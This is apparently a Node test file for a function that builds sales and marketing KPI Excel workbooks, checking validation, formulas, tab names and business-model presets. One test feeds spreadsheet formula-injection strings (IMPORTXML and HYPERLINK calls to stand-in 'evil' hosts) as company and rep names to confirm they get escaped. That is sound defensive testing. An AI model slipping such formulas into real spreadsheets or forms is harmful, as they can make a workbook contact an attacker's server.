import test from 'node:test';import assert from 'node:assert/strict';
import {validate,buildWorkbook,modelPreset} from '../netlify/functions/_builder.mjs';
const b={company:'Acme',industry:'Manufacturing',annualRevenue:2000000,revenueGoal:3000000,averageDeal:5000,reps:['Alex','Robin'],model:'B2B',notes:'Improve win rate'};
test('validates profile',()=>{const p=validate(b);assert.equal(p.names.length,2);assert.equal(p.annualRevenue,2000000)});
test('generates four useful tabs and KPI formulas',()=>{const p=validate(b),w=buildWorkbook(p);assert.equal(w.sheets.length,4);assert.equal(w.values.length,4);assert.equal(w.values[2].values.length,504);assert.match(w.values[2].values[4][9],/E5\/D5/);assert.equal(w.values[1].values[19][0],'Alex');assert.match(w.values[3].values[9][1],/ROUNDUP/)});
test('deduplicates reps, enforces 15 max',()=>{const p=validate({...b,reps:['A','A',...Array.from({length:25},(_,i)=>`Rep${i}`)]});assert.equal(p.names.length,15);});
test('protects text against spreadsheet formula injection',()=>{const p=validate({...b,company:'=IMPORTXML("http://evil.example")',reps:['=HYPERLINK("http://evil")']});const w=buildWorkbook(p);assert.match(w.values[0].values[1][1],/^'/);assert.match(w.values[1].values[19][0],/^'/);});

test('creates an actual Excel workbook with formulas and the four tabs',async()=>{
 const {createExcelWorkbook}=await import('../netlify/functions/_builder.mjs');
 const ExcelJS=(await import('exceljs')).default;
 const p=validate(b),bytes=await createExcelWorkbook(buildWorkbook(p),p);
 assert.ok(bytes.length>15000);
 const wb=new ExcelJS.Workbook();await wb.xlsx.load(bytes);
 assert.deepEqual(wb.worksheets.map(s=>s.name),['KPI DASHBOARD','MARKETING FUNNEL','START HERE & GROWTH','DAILY SALES KPI']);
 assert.match(wb.getWorksheet('DAILY SALES KPI').getCell('J5').value.formula,/E5\/D5/);
 assert.match(wb.getWorksheet('START HERE & GROWTH').getCell('B27').value.formula,/ROUNDUP/);
 assert.equal(wb.getWorksheet('KPI DASHBOARD').getCell('A65').value,'Alex');
 assert.match(wb.getWorksheet('KPI DASHBOARD').getCell('A5').value.formula,/MARKETING FUNNEL/);
 assert.match(wb.getWorksheet('MARKETING FUNNEL').getCell('V6').value.formula,/P6-Q6/);
 for(const name of ['START HERE & GROWTH','KPI DASHBOARD']) assert.ok(!wb.getWorksheet(name).views.some(v=>v.state==='frozen' && !v.ySplit && !v.xSplit),`${name} must not have zero-size frozen panes`);
});

test('model presets cover distinct funnels and allow unstaffed ecommerce',()=>{
 const e=validate({...b,model:'E-commerce / online store',reps:[],marketingSpend:5000,monthlyLeads:2000,grossMargin:40});
 assert.deepEqual(e.names,['Team']); assert.equal(e.grossMargin,40);
 assert.equal(modelPreset(e.model).labels[0],'Store Sessions');
 const w=validate({...b,model:'Webinar / virtual event'});
 assert.equal(modelPreset(w.model).labels[1],'Webinar Registrations');
});
